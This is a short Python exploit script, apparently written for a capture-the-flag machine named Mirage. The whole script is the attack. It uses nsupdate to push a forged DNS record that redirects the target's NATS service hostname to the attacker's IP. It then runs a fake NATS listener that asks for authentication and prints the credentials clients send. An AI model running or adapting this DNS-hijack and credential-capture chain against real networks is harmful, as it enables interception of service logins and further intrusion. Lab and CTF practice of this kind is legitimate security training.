#!/usr/bin/python3

import subprocess, sys, socket, time, json

dns_conf_template = """server {mirage_ip}
zone mirage.htb
update add nats-svc.mirage.htb 15 A {ip}
send"""



def create_config(ip,mirage_ip):
    print("\n[+] Creating Fake server info")
    time.sleep(3)
    dns_conf = dns_conf_template.format(ip=ip, mirage_ip=mirage_ip)
    with open("config.txt", "w") as file:
            file.write(dns_conf)
    print("\n[+] Configuration Created")
    time.sleep(2)
    
def update_dns(mirage_ip,ip):
    print("\n[+] Updating DNS Record >:)")
    time.sleep(2)
    subprocess.run(["nsupdate", "-v", "config.txt"])
    result = subprocess.run(["dig", "nats-svc.mirage.htb", f"@{mirage_ip}", "+short"],capture_output=True,text=True)
    ip_dig = result.stdout.strip()

    if ip == ip_dig:
        print(f"\n[+] Successfully updated >:), DNS for NATS SVC now is {ip_dig}")
    else:
        print("\n[!] SOmething goes wrong...")
        exit(1)

def nats_fake_server(p=4222, t=60):
    s = socket.socket(); s.setsockopt(1,2,1); s.bind(('',p)); s.listen(); s.settimeout(1); a=time.time()
    print(f"\n[+] Fake NATS on 0.0.0.0:{p} for {t}s")
    try:
        while time.time() - a < t:
            try:
                c, _ = s.accept()
                c.sendall(b'INFO {"server_id":"FAKE","auth_required":true}\r\n')
                data = c.recv(1024).decode(errors="ignore")
                print(f"\n[+] Received: \n{data}")
                c.close()
            except socket.timeout:
                pass
    finally:
        s.close()
    
if __name__ == "__main__":
    try:
        if len(sys.argv) < 3:
            print(f"\n[!] Use: ./mirage-exploit.py <VPN IP> <MIRAGE IP>")
            exit(1)

        ip = sys.argv[1]
        mirage_ip = sys.argv[2]

        create_config(ip, mirage_ip)
        update_dns(mirage_ip, ip)
        nats_fake_server()
        
    except KeyboardInterrupt:
        print("\n[!] Ctrl+C detected. Exiting ...")
        sys.exit(0)
